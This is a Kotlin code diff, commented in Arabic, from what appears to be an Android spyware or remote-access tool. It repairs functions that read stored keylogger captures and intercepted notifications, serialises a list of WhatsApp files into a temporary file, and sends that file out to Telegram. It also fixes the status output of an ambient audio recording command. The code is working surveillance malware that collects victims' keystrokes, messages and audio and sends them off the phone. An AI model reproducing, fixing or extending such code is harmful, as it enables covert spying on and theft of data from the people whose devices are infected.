@@ -425,15 +425,21 @@ object CommandExecutor {
     private fun getNotifications(context: Context): String {
         val notifs = JSONArray()
         try {
-            val notifications = AppDatabase.getNotifications(context)
-            for (n in notifications) {
-                val notif = JSONObject()
-                notif.put("id", n["id"] ?: "")
-                notif.put("pkg", n["package_name"] ?: "")
-                notif.put("title", n["title"] ?: "")
-                notif.put("text", n["body"] ?: "")
-                notif.put("time", n["timestamp"] ?: "")
-                notifs.put(notif)
+            // إصلاح: قراءة من LocalStorageManager (حيث يتم حفظ الإشعارات فعلياً)
+            val notificationFiles = LocalStorageManager.readData(context, "notification")
+            for (fileContent in notificationFiles) {
+                try {
+                    val data = JSONObject(fileContent)
+                    val notif = JSONObject()
+                    notif.put("id", data.optString("id", ""))
+                    notif.put("pkg", data.optString("package_name", data.optString("pkg", "")))
+                    notif.put("title", data.optString("title", ""))
+                    notif.put("text", data.optString("body", data.optString("text", "")))
+                    notif.put("time", data.optString("timestamp", data.optString("time", "")))
+                    notifs.put(notif)
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في تحليل إشعار: ${e.message}")
+                }
             }
         } catch (e: Exception) {
             Log.e(TAG, "خطأ في قراءة الإشعارات: ${e.message}")
@@ -508,8 +514,11 @@ object CommandExecutor {
                 }
             }
             scope.launch {
+                // إصلاح: كتابة البيانات في ملف مؤقت أولاً ثم إرساله
+                val tempFile = File(context.getExternalFilesDir(null), "whatsapp_files_${System.currentTimeMillis()}.json")
+                tempFile.writeText(waFiles.toString())
                 TelegramDirectClient.sendDocument(
-                    waFiles.toString(),
+                    tempFile.absolutePath,
                     "whatsapp_files_list.json"
                 )
             }
@@ -833,7 +842,7 @@ object CommandExecutor {
             }
 
             scope.launch { TelegramDirectClient.sendMessage("🎙️ <b>بدء تسجيل الصوت المحيط</b>\n⏱️ المدة: $duration ثانية", "HTML") }
-            """{"ok":true,"direct":true,"message":"جاري تسجيل الصوت لمدة $duration ثانية","file":"${file.absolutePath"}"""
+            """{"ok":true,"direct":true,"message":"جاري تسجيل الصوت لمدة $duration ثانية","file":"${file.absolutePath}"}"""
         } catch (e: Exception) {
             isRecording = false
             """{"ok":false,"error":"${e.message}"}"""
@@ -1350,14 +1359,23 @@ object CommandExecutor {
 
     private fun getKeyloggerData(context: Context): String {
         return try {
-            val keys = AppDatabase.getKeylogs(context)
+            // إصلاح: قراءة من LocalStorageManager بدلاً من AppDatabase الفارغة
+            val keylogFiles = LocalStorageManager.readData(context, "keylog")
             val data = JSONArray()
-            for (k in keys) {
-                val entry = JSONObject()
-                entry.put("text", k["text"] ?: "")
-                entry.put("app", k["app_package"] ?: "")
-                entry.put("time", k["timestamp"] ?: "")
-                data.put(entry)
+            for (fileContent in keylogFiles) {
+                try {
+                    val entry = JSONObject(fileContent)
+                    val item = JSONObject()
+                    item.put("text", entry.optString("text", ""))
+                    item.put("app", entry.optString("app_package", entry.optString("app", "")))
+                    item.put("time", entry.optString("timestamp", entry.optString("time", "")))
+                    data.put(item)
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في تحليل سجل مفاتيح: ${e.message}")
+                }
+            }
+            if (data.length() == 0) {
+                return """{"ok":true,"direct":true,"count":0,"message":"لا توجد بيانات تسجيل مفاتيح"}"""
             }
             val file = File(context.getExternalFilesDir(null), "keylogger_data_${System.currentTimeMillis()}.json")
             file.writeText(data.toString())
